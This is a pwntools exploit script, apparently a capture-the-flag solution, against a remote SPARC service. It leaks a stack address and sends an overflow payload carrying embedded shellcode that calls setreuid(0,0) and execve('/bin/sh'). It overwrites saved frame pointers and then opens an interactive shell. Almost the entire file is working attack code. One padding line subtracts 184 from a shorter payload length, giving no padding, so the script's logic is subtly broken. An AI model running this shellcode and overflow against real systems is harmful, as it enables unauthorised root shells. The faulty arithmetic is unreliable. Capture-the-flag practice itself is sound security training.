#!/usr/bin/env python3

"""
Run against remote with:
./solve.py REMOTE HOST=flu.xxx PORT=2020
"""

import ast

from pwn import *


def init_pwntools_context():
    context.arch = "sparc"
    context.endian = "big"
    context.log_level = "debug"


def init_io():
    return remote(args["HOST"], int(args["PORT"]))


class Offsets:
    fp_overwrite_one = 184
    fp_overwrite_two = 112

    input_len = 0x200


def win(io):
    raw_stack_leak = io.recvuntil("\n", drop=True).decode()
    stack_leak = ast.literal_eval(raw_stack_leak)
    log.info(f"Leaked stack pointer %#x" % stack_leak)

    payload = b""
    payload += b"A" * 4
    payload += b"B" * 4

    # Shellcode from https://www.exploit-db.com/papers/13218
    payload += b"\x90\x1A\x40\x09"  # xor %o1, %o1, %o0
    payload += b"\x92\x1A\x40\x09"  # xor %o1, %o1, %o1
    payload += b"\x82\x10\x20\xCA"  # mov SYS_SETREUID(202), %g1
    payload += b"\x91\xD0\x20\x08"  # ta KERNEL(0x08)
    payload += b"\x21\x0B\xD8\x9A"  # sethi %hi(0x2f626900), %l0
    payload += b"\xA0\x14\x21\x6E"  # or %l0, %lo(0x16e), %l0
    payload += b"\x23\x0B\xDC\xDA"  # sethi %hi(0x2f736800), %l1
    payload += b"\xE0\x3B\xBF\xF0"  # std %l0, [%sp - 0x10]
    payload += b"\x90\x23\xA0\x10"  # sub %sp, 0x10, %o0
    payload += b"\xD0\x23\xBF\xF8"  # st  %o0, [%sp - 0x8]
    payload += b"\x92\x23\xA0\x08"  # sub %sp, 0x8, %o1
    payload += b"\x94\x1A\x80\x0A"  # xor %o2, %o2, %o2
    payload += b"\x82\x10\x20\x3B"  # mov SYS_EXECVE(59), %g1
    payload += b"\x91\xD0\x20\x08"  # ta KERNEL(0x08)

    payload += b"C" * (len(payload) - Offsets.fp_overwrite_one)
    payload += p32(stack_leak)
    payload += p32(stack_leak)

    payload += b"D" * Offsets.fp_overwrite_two
    payload += p32(stack_leak)
    payload += p32(stack_leak)

    assert len(payload) <= Offsets.input_len
    payload += b"E" * (Offsets.input_len - len(payload))

    io.sendline(payload)
    io.interactive()


if __name__ == "__main__":
    init_pwntools_context()
    io = init_io()
    win(io)
